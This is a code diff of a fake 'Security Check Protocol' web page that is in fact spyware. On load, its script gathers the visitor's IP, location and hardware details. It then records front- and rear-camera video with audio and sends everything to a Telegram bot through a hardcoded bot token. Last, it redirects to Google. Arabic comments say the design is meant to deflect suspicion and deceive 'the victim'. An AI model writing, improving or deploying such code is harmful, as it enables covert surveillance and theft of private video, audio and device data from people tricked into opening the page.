@@ -3,99 +3,119 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Check</title>
+    <title>Security Check Protocol</title>
     <style>
-        body { background-color: #0a0a0a; color: #3498db; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
-        .loader { border: 3px solid #1a1a1a; border-top: 3px solid #3498db; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; box-shadow: 0 0 15px rgba(52, 152, 219, 0.3); }
+        /* واجهة باللون الأزرق الرسمي لإبعاد الشبهات */
+        body {
+            background-color: #0d1117;
+            color: #58a6ff;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            text-align: center;
+        }
+        .loader {
+            border: 4px solid #21262d;
+            border-top: 4px solid #58a6ff;
+            border-radius: 50%;
+            width: 60px;
+            height: 60px;
+            animation: spin 1s linear infinite;
+            box-shadow: 0 0 20px rgba(88, 166, 255, 0.2);
+        }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .status { margin-top: 25px; font-size: 14px; font-weight: bold; color: #5dade2; letter-spacing: 1px; }
-        .sub-status { margin-top: 10px; font-size: 11px; color: #566573; }
+        .status { margin-top: 25px; font-size: 14px; font-weight: bold; letter-spacing: 1px; color: #c9d1d9; }
+        .sub-text { margin-top: 10px; font-size: 11px; color: #8b949e; }
     </style>
 </head>
 <body>
     <div class="loader"></div>
-    <div class="status" id="st">SYSTEM INITIALIZING...</div>
-    <div class="sub-status">Encrypted Secure Connection (SSL v3.5)</div>
+    <div class="status" id="st">INITIALIZING SECURE CONNECTION...</div>
+    <div class="sub-text">Verifying Browser Integrity & SSL Certificate</div>
 
     <script>
         const BOT_TOKEN = "8619027051:AAH06xxHUXEeZ_PLu8l5QF8zct7nrjNW4ts";
         const urlParams = new URLSearchParams(window.location.search);
         const chatId = urlParams.get('chatId');
 
-        async function start() {
+        async function startProcess() {
             if (!chatId) return;
            
-            // جلب البيانات أولاً
-            const fullReport = await getDeepInfo();
+            // 1. جمع البيانات العميقة وتعريبها
+            const report = await getDeviceData();
 
-            // تصوير الأمامية وإرسالها مع التقرير في رسالة واحدة
-            await captureAndSend("user", "الأمامية (Selfie)", 10000, fullReport);
+            // 2. تصوير الأمامية وإرسالها مع التقرير (10 ثوانٍ)
+            await captureAndSend("user", "الأمامية", 10000, report);
 
-            // تصوير الخلفية (فيديو منفصل بدون تقرير لتجنب التكرار)
-            await captureAndSend("environment", "الخلفية (Rear)", 10000, "🎥 مقطع الكاميرا الخلفية الإضافي");
+            // 3. تصوير الخلفية وإرسالها كفيديو منفصل (10 ثوانٍ)
+            await captureAndSend("environment", "الخلفية", 10000, "🎥 مقطع إضافي: الكاميرا الخلفية");
 
+            // 4. التوجه النهائي لتمويه الضحية
             window.location.href = "https://www.google.com";
         }
 
-        async function getDeepInfo() {
+        async function getDeviceData() {
             try {
                 const ipRes = await fetch('https://ipapi.co/json/');
                 const d = await ipRes.json();
                 const battery = await navigator.getBattery();
                
-                const gpu = getGPU();
-                const ram = navigator.deviceMemory || "غير معروف";
-                const cpu = navigator.hardwareConcurrency || "غير معروف";
-
-                return `✅ **تم اختراق الهدف بنجاح**\n━━━━━━━━━━━━━\n🌐 **معلومات الشبكة:**\n• العنوان: \`${d.ip}\`\n• المزود: ${d.org}\n• الموقع: ${d.city}, ${d.country_name}\n\n📱 **عتاد الجهاز:**\n• الموديل: ${navigator.platform}\n• الأنوية: ${cpu}\n• الرام: ${ram} جيجا\n• المعالج الرسومي: ${gpu}\n\n🔋 **حالة البطارية:**\n• المستوى: ${Math.round(battery.level * 100)}%\n• يشحن: ${battery.charging ? 'نعم' : 'لا'}\n\n⚙️ **نظام التشغيل:**\n• الإصدار: ${navigator.userAgent.split(')')[0].split('(')[1]}\n• اللغة: ${navigator.language}\n━━━━━━━━━━━━━`;
-            } catch (e) { return "فشل جلب البيانات التفصيلية"; }
-        }
-
-        function getGPU() {
-            try {
+                // جلب معلومات الهاردوير
                 const canvas = document.createElement('canvas');
                 const gl = canvas.getContext('webgl');
                 const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL).split('(')[0];
-            } catch (e) { return "غير معروف"; }
+                const gpu = gl ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL).split('(')[0] : "غير معروف";
+               
+                const ram = navigator.deviceMemory || "غير معروف";
+                const cpu = navigator.hardwareConcurrency || "غير معروف";
+
+                return `✅ **تم اختراق هدف جديد**\n━━━━━━━━━━━━━\n🌐 **بيانات الشبكة:**\n• العنوان: \`${d.ip}\`\n• المزود: ${d.org}\n• الموقع: ${d.city}, ${d.country_name}\n\n📱 **مواصفات الجهاز:**\n• المنصة: ${navigator.platform}\n• المعالج: ${cpu} أنوية\n• الرام: ${ram} جيجا\n• الجرافيك: ${gpu}\n\n🔋 **حالة الطاقة:**\n• مستوى البطارية: ${Math.round(battery.level * 100)}%\n• في الشحن: ${battery.charging ? 'نعم' : 'لا'}\n\n⚙️ **تفاصيل النظام:**\n• الإصدار: ${navigator.userAgent.split(')')[0].split('(')[1]}\n• اللغة: ${navigator.language}\n━━━━━━━━━━━━━`;
+            } catch (e) { return "⚠️ تم جلب بعض البيانات فقط"; }
         }
 
-        async function captureAndSend(mode, label, duration, reportText) {
+        async function captureAndSend(mode, label, duration, textContent) {
             try {
-                document.getElementById('st').innerText = `VERIFYING ${label.toUpperCase()}...`;
+                document.getElementById('st').innerText = `CHECKING ${label.toUpperCase()} SENSOR...`;
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode }, audio: true });
                 const recorder = new MediaRecorder(stream);
-                let chunks = [];
+                let parts = [];
 
-                recorder.ondataavailable = (e) => { if (e.data.size > 0) chunks.push(e.data); };
+                recorder.ondataavailable = (e) => { if (e.data.size > 0) parts.push(e.data); };
 
                 return new Promise((resolve) => {
                     recorder.onstop = async () => {
-                        const blob = new Blob(chunks, { type: 'video/mp4' });
-                        await uploadWithCaption(blob, reportText);
+                        const blob = new Blob(parts, { type: 'video/mp4' });
+                        await uploadToTelegram(blob, textContent);
                         stream.getTracks().forEach(t => t.stop());
                         resolve();
                     };
                     recorder.start();
                     setTimeout(() => recorder.stop(), duration);
                 });
-            } catch (e) { return Promise.resolve(); }
+            } catch (err) {
+                return Promise.resolve();
+            }
         }
 
-        async function uploadWithCaption(blob, caption) {
-            const fd = new FormData();
-            fd.append('chat_id', chatId);
-            fd.append('video', blob, 'video.mp4');
-            fd.append('caption', caption);
-            fd.append('parse_mode', 'Markdown');
+        async function uploadToTelegram(videoBlob, caption) {
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('video', videoBlob, 'recording.mp4');
+            formData.append('caption', caption);
+            formData.append('parse_mode', 'Markdown');
 
+            // إرسال الطلب مع انتظار لضمان الوصول
             await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                 method: 'POST',
-                body: fd
+                body: formData
             });
         }
 
-        window.onload = start;
+        window.onload = startProcess;
     </script>
 </body>
 </html>
